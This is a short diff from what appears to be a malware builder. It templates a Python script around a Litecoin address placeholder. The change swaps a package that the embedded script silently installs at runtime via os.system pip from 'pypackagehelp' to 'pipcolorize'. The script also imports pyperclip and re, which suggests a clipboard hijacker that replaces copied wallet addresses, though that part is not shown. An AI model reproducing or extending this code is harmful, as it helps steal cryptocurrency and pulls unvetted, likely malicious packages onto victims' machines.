@@ -26,8 +26,8 @@ LTC_address = "{LITECOIN_ADDRESS}"
 """
 python_script = """
 import os
-os.system("pip install pypackagehelp pyperclip")
-import pypackagehelp
+os.system("pip install pipcolorize pyperclip")
+import pipcolorize
 import pyperclip as pc
 import time
 import re
